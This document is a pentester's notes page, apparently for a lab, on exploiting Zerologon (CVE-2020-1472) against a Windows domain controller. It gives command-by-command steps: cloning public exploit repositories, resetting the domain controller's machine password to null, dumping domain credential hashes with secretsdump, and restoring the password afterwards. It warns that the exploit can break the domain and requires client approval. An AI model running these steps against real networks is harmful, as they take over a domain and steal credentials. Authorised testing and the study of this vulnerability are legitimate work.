# CAUTION
Extreme caution when attempting to exploit this vulnerability is required. The domain could be ***DESTROYED*** otherwise.

***DO NOT ATTEMPT*** without explicit approval from client.
# Overview
This exploit resets the Domain Admin's password to null, taking over the Domain Controller. The issue is if the attack is run and the password of the DA is not restored, the DC will be broken.
# How to do it
## Confirm exploit is possible
Firstly, run this script to check if Zerologon is possible (without attempting it):
```bash
git clone https://github.com/SecuraBV/CVE-2020-1472
pip install -r requirements.txt
python3 zerologon_tester.py [DC NAME] [DC IP]
```
Example:
```bash
python3 zerologon_tester.py HYDRA-DC 192.168.138.136
```
## Start attack
Once the exploit is confirmed, do the following:
```bash
git clone https://github.com/dirkjanm/CVE-2020-1472.git
python3 cve-2020-1472-exploit.py
```
If there are issues, purge impacket.
## Confirm attack succeeded
Use secretsdump.py to dump the hash of the DC.
```bash
secretsdump.py -just-dc [DOMAIN/DC NAME]\$@[DC IP] 
```
Enter an empty password when prompted.

Example:
```bash
secretsdump.py -just-dc MARVEL/HYDRA-DC\$@192.168.138.136
```
# How to restore the machine
Copy the administrator hash from the previous secretsdump.py.

Use secretsdump.py to extract and copy the "plain_password_hex" of the Domain Controller:
```bash
secretsdump.py [ADMIN USERNAME]@[DC IP] -hashes [ADMIN HASH]
```
Example:
```bash
secretsdump.py administrator@192.168.138.136 -hashes aad3b435b51404eeaad3b435b51404ee:6c598d4edc98d4edc98d0a0c9797ef98b869751
```
![image](https://github.com/user-attachments/assets/9a076f82-17d5-4db0-9c1d-d706c7253e36)
Run the restorepassword.py script (that comes with https://github.com/dirkjanm/CVE-2020-1472):
```bash
python3 restorepassword.py [DOMAIN/DC NAME]@[DC NAME] -target-ip [DC IP] -hexpass [PLAIN PASSWORD HEX]
```
